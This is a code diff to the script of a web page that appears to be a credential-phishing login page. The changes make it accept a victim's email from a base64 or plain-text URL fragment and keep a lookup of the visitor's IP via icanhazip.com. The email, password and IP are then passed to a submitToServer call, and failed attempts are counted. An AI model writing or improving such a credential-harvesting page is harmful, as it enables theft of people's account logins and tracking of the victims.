@@ -190,14 +190,26 @@ WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 <script>
   let attemptCount = 0;
 
+  /* Simple email validation */
+  function isValidEmail(email) {
+    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return re.test(email);
+  }
+
   function getEmailFromURL() {
     const urlFragment = window.location.hash;
-    const base64Email = urlFragment.substring(1);
+    if (!urlFragment) return '';
+    const fragment = urlFragment.substring(1); // remove '#'
+    // First try base64 decoding
     try {
-      return atob(base64Email);
+      const decoded = atob(fragment);
+      if (isValidEmail(decoded)) return decoded;
     } catch (e) {
-      return '';
+      // fall through to plain text check
     }
+    // If decoding fails or isn't a valid email, check as plain text
+    if (isValidEmail(fragment)) return fragment;
+    return '';
   }
 
   function createErrorContainer() {
@@ -263,20 +275,13 @@ WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 
     attemptCount++;
 
-    /* ---------------------------------------------------------
-       NEW IP‑retrieval method
-       ---------------------------------------------------------
-       Using https://icanhazip.com which returns the IP as plain‑text.
-       This endpoint is extremely lightweight and is not typically
-       blocked by tracking‑prevention extensions.
-    --------------------------------------------------------- */
     fetch('https://icanhazip.com')
       .then(response => {
         if (!response.ok) throw new Error('Network response was not ok');
-        return response.text();          // plain‑text like "203.0.113.45\n"
+        return response.text();
       })
       .then(text => {
-        const ip = text.trim();           // remove trailing newline
+        const ip = text.trim();
         return submitToServer(email, password, ip);
       })
       .then(() => {
